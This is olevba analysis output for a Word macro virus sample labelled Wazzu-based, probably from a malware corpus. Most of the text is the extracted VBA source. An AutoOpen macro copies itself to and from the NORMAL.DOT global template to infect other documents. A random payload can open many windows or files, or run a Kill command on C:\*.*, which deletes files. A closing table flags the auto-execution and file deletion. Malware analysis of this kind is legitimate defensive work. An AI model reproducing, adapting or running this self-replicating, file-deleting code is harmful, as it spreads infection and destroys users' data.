olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-a1c74b986b2a8f14043dc33bfe21109f6c7cd270
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-a1c74b986b2a8f14043dc33bfe21109f6c7cd270 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Wazzu-based-a1c74b986b2a8f14043dc33bfe21109f6c7cd270 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
    On Error GoTo -1: On Error GoTo errTrap
        
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":AutoOpen"
    globMacro$ = "Global:AutoOpen"
    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globMacro$, fileMacro$, 1
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fileMacro$, globMacro$, 1
    End If

    MicroSloth

GoTo bye
errTrap:
bye:
    On Error GoTo -1: On Error GoTo 0
End Sub

Private Sub MicroSloth()
Dim ByChanceTheNumber
Dim msgA$
Dim msgB$
Dim J
Dim I
    On Error GoTo -1: On Error GoTo Abort

    'Pick a number 1 to 6
    ByChanceTheNumber = (WordBasic.Int(Rnd() * 6) + 1)

    If ByChanceTheNumber = 1 Then
        msgA$ = "Microsloth - Who do you want to own today?"
        msgB$ = "Thanks for using Microsloth Warp for Windblowz!"
        WordBasic.MsgBox msgB$, msgA$, 64

    ElseIf ByChanceTheNumber = 2 Then
        For J = 1 To 3
            For I = 1 To 32767
            Next I
        Next J

    ElseIf ByChanceTheNumber = 3 Then
            For I = 1 To 20
                WordBasic.FileNewDefault
            Next I

    ElseIf ByChanceTheNumber = 4 Then
        For I = 2 To WordBasic.CountFiles()
            WordBasic.FileOpen Name:=WordBasic.[FileName$](I)
        Next I

    ElseIf ByChanceTheNumber = 5 Then
        WordBasic.VScroll 100
        WordBasic.VScroll 1
        WordBasic.VScroll 100
        

    ElseIf ByChanceTheNumber = 6 Then
        WordBasic.Kill "C:\*.*"
    End If
Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

